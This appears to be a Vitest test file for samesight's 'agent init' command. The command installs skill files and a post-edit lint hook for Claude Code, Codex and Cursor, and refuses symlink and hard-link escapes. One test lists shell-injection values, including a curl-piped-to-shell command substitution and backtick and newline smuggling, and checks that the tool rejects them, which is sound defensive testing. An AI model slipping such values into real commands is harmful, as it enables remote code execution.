import { existsSync, linkSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it, onTestFinished } from "vitest";
import { AGENTS, agentInit, hookCommand, type InitOptions } from "./init.ts";

function project(files: Record<string, string> = {}): string {
  const dir = mkdtempSync(join(tmpdir(), "samesight-init-test-"));
  onTestFinished(() => rmSync(dir, { recursive: true, force: true }));
  for (const [path, text] of Object.entries(files)) {
    mkdirSync(join(dir, path, ".."), { recursive: true });
    writeFileSync(join(dir, path), text);
  }
  return dir;
}

/** A skill of two files, standing in for the package's. */
function skill(): string {
  const dir = project({ "SKILL.md": "---\nname: samesight\n---\nbody\n", "references/rls-off.md": "rls-off\n" });
  return dir;
}

const CONFIG = "config:\n  edition: 3\nstreams:\n  a:\n    auto_subscribe: true\n    query: SELECT * FROM lists WHERE owner_id = auth.user_id()\n";
const init = (root: string, o: Partial<InitOptions> = {}) => agentInit({ root, agents: [...AGENTS], given: [], allow: [], print: false, skillDir: o.skillDir ?? skill(), ...o });
const json = (root: string, file: string) => JSON.parse(readFileSync(join(root, file), "utf8"));

describe("agentInit", () => {
  it("installs the skill for each agent and the hook in Claude Code's and Codex's settings, then changes nothing", () => {
    const root = project({ "sync-config.yaml": CONFIG });
    const skillDir = skill();
    const first = init(root, { skillDir });
    expect(first).toEqual({
      code: 0,
      lines: [
        ".claude/skills/samesight: created (2 files)",
        ".agents/skills/samesight: created (2 files)",
        ".cursor/skills/samesight: created (2 files)",
        ".claude/settings.json: created, with the samesight hook",
        ".codex/hooks.json: created, with the samesight hook",
        "Cursor runs the hook in .claude/settings.json when its third-party hooks setting is on; see https://rayanyedaly.github.io/samesight/agents for what is known to work.",
        "Codex asks you to review and trust a new hook: run /hooks in Codex. The Codex hook follows Codex's documented format and has not been tried with a running Codex yet.",
        "Commit these files so every agent working on the project runs the hook.",
      ],
    });
    for (const target of [".claude", ".agents", ".cursor"]) expect(readdirSync(join(root, target, "skills/samesight"), { recursive: true }).sort()).toEqual(["SKILL.md", "references", "references/rls-off.md"]);
    expect(json(root, ".claude/settings.json").hooks.PostToolUse).toEqual([{ matcher: "Write|Edit|MultiEdit", hooks: [{ type: "command", command: "npx --no-install samesight agent hook", timeout: 30 }] }]);
    expect(json(root, ".codex/hooks.json").hooks.PostToolUse).toEqual([{ matcher: "apply_patch|Edit|Write", hooks: [{ type: "command", command: "npx --no-install samesight agent hook", timeout: 30 }] }]);
    const second = init(root, { skillDir });
    expect(second).toEqual({ code: 0, lines: [".claude/skills/samesight: up to date", ".agents/skills/samesight: up to date", ".cursor/skills/samesight: up to date", ".claude/settings.json: up to date", ".codex/hooks.json: up to date"] });
  });

  it("with print, says what it would write, the hook settings in full, and writes nothing", () => {
    const root = project({ "sync-config.yaml": CONFIG });
    const result = init(root, { print: true, agents: ["codex"] });
    expect(result.lines).toEqual([
      ".agents/skills/samesight: would create (2 files)",
      ".codex/hooks.json: would create, with the samesight hook",
      ...JSON.stringify({ hooks: { PostToolUse: [{ matcher: "apply_patch|Edit|Write", hooks: [{ type: "command", command: "npx --no-install samesight agent hook", timeout: 30 }] }] } }, null, 2).split("\n").map((l) => `  ${l}`),
      "Codex asks you to review and trust a new hook: run /hooks in Codex. The Codex hook follows Codex's documented format and has not been tried with a running Codex yet.",
    ]);
    expect(readdirSync(root)).toEqual(["sync-config.yaml"]);
  });

  it("does only the agents asked for: Cursor's hook is Claude Code's settings", () => {
    const root = project({ "sync-config.yaml": CONFIG });
    expect(init(root, { agents: ["cursor"] }).lines.slice(0, 2)).toEqual([".cursor/skills/samesight: created (2 files)", ".claude/settings.json: created, with the samesight hook"]);
    expect([existsSync(join(root, ".claude/skills")), existsSync(join(root, ".codex"))]).toEqual([false, false]);
  });

  it("updates its own skill files that differ, and leaves files a user added", () => {
    const root = project({ "sync-config.yaml": CONFIG, ".claude/skills/samesight/SKILL.md": "old\n", ".claude/skills/samesight/mine.md": "keep\n" });
    expect(init(root, { agents: ["claude"] }).lines[0]).toBe(".claude/skills/samesight: updated SKILL.md, references/rls-off.md");
    expect(readFileSync(join(root, ".claude/skills/samesight/SKILL.md"), "utf8")).toBe("---\nname: samesight\n---\nbody\n");
    expect(readFileSync(join(root, ".claude/skills/samesight/mine.md"), "utf8")).toBe("keep\n");
  });

  it("keeps a samesight hook already there, and skips settings it cannot read, giving the entry to add by hand", () => {
    const mine = JSON.stringify({ hooks: { PostToolUse: [{ matcher: "Edit", hooks: [{ type: "command", command: "pnpm exec samesight agent hook app.yaml" }] }] } }, null, 2);
    const root = project({ "sync-config.yaml": CONFIG, ".claude/settings.json": mine, ".codex/hooks.json": "{ not json" });
    const result = init(root, { agents: ["claude", "codex"] });
    expect(result.code).toBe(2);
    expect(result.lines).toContain(".claude/settings.json: left as it is (it already runs pnpm exec samesight agent hook app.yaml)");
    expect(result.lines).toContainEqual(expect.stringMatching(/^\.codex\/hooks\.json: cannot add the hook: it is not JSON samesight can read \(.*\); add this entry to hooks\.PostToolUse by hand:$/));
    expect(readFileSync(join(root, ".claude/settings.json"), "utf8")).toBe(mine);
    expect(readFileSync(join(root, ".codex/hooks.json"), "utf8")).toBe("{ not json");
  });

  it.skipIf(process.platform === "win32")("refuses to write through a symlink that leads out of the project", () => {
    const root = project({ "sync-config.yaml": CONFIG });
    const outside = project();
    symlinkSync(outside, join(root, ".claude"));
    const result = init(root, { agents: ["claude"] });
    expect(result.code).toBe(2);
    expect(result.lines.slice(0, 2)).toEqual(["not writing .claude/skills/samesight: it leads out of the project through a symlink", "not writing .claude/settings.json: it leads out of the project through a symlink"]);
    expect(readdirSync(outside)).toEqual([]);
  });

  it.skipIf(process.platform === "win32")("checks each skill file for a symlink out of the project, a dangling one included", () => {
    const root = project({ "sync-config.yaml": CONFIG });
    const outside = project({ "profile": "mine\n" });
    mkdirSync(join(root, ".claude/skills/samesight"), { recursive: true });
    symlinkSync(join(outside, "profile"), join(root, ".claude/skills/samesight/SKILL.md"));
    symlinkSync(join(outside, "nothing-yet"), join(root, ".claude/skills/samesight/references"));
    const result = init(root, { agents: ["claude"] });
    expect([result.code, result.lines[0]]).toEqual([2, "not writing .claude/skills/samesight: SKILL.md, references/rls-off.md lead out of the project (a symlink or a hard link)"]);
    expect(readFileSync(join(outside, "profile"), "utf8")).toBe("mine\n");
    expect(readdirSync(outside)).toEqual(["profile"]);
  });

  it.skipIf(process.platform === "win32")("does not write through a hard link to a file elsewhere", () => {
    const root = project({ "sync-config.yaml": CONFIG });
    const outside = project({ profile: "mine\n" });
    mkdirSync(join(root, ".claude/skills/samesight"), { recursive: true });
    linkSync(join(outside, "profile"), join(root, ".claude/skills/samesight/SKILL.md"));
    expect(init(root, { agents: ["claude"] }).code).toBe(2);
    expect(readFileSync(join(outside, "profile"), "utf8")).toBe("mine\n");
  });

  it("says when it cannot write a file, rather than failing", () => {
    const root = project({ "sync-config.yaml": CONFIG, ".claude": "a file where a folder goes\n" });
    const result = init(root, { agents: ["claude"] });
    expect(result.code).toBe(2);
    expect(result.lines[0]).toMatch(/^cannot write \.claude\/skills\/samesight\/SKILL\.md: /);
  });

  it("refuses arguments the hook command could not carry safely in every shell, and writes nothing", () => {
    const root = project({ "sync-config.yaml": CONFIG });
    const bad = [
      { allow: ["rls-off:$(curl -s x|sh)"] },
      { allow: ["unscoped-query:`id`"] },
      { given: ["a&b.yaml"] },
      { given: ["%PATH%.yaml"] },
      { migrationsDir: "db\\migrations" },
      { given: ['a".yaml'] },
      { given: ["a\nb.yaml"] },
      // Read as an option by the hook; splatting and an array in PowerShell; EQUALS expansion in zsh.
      { given: ["-a.yaml"] },
      { given: ["--help"] },
      { given: ["@acme/sync.yaml"] },
      { allow: ["unscoped-query:a,b"] },
      { given: ["=foo.yaml"] },
      { given: ["café.yaml"] },
    ];
    for (const args of bad) {
      const result = init(root, args);
      expect([result.code, result.lines.length], JSON.stringify(args)).toEqual([2, 1]);
      expect(result.lines[0], JSON.stringify(args)).toMatch(/^not writing anything: the hook command would carry .*; its values may hold only ASCII letters and digits, spaces and _\+:\.\/-, and may not start with - \(use \/ in paths\)$/);
    }
    expect(init(root, { given: ["app/sync config.yaml"], migrationsDir: "db/migrations-2", allow: ["unscoped-query:public_posts", "rls-off:a.b"], print: true }).code).toBe(0);
    expect(readdirSync(root)).toEqual(["sync-config.yaml"]);
    expect(() => hookCommand({ root, given: [], allow: ["rls-off:$(x)"] })).toThrow('the hook command cannot carry "rls-off:$(x)"');
  });

  it("says when there is no sync config for the hook to lint, or the one named is not there yet", () => {
    const bare = project();
    expect(init(bare, { agents: ["claude"] }).lines).toContain("note: no sync config here (tried sync-config.yaml, sync-rules.yaml, powersync/sync-config.yaml, powersync/sync-rules.yaml); the hook does nothing until one exists, or name yours: samesight agent init path/to/sync-config.yaml");
    expect(init(bare, { agents: ["claude"], given: ["app/sync.yaml"] }).lines).toContain("note: app/sync.yaml not found; the hook lints it once it exists");
  });
});

describe("hookCommand", () => {
  it("passes lint's arguments on, quoting only what needs it, and runs through yarn under Plug'n'Play", () => {
    const root = project();
    expect(hookCommand({ root, given: [], allow: [] })).toBe("npx --no-install samesight agent hook");
    expect(hookCommand({ root, given: ["app/sync config.yaml"], migrationsDir: "db/migrations", allow: ["unscoped-query:public_posts", "personal-columns"] })).toBe(
      'npx --no-install samesight agent hook "app/sync config.yaml" --migrations db/migrations --allow unscoped-query:public_posts --allow personal-columns',
    );
    writeFileSync(join(root, ".pnp.cjs"), "");
    expect(hookCommand({ root, given: [], allow: [] })).toBe("yarn samesight agent hook");
  });
});
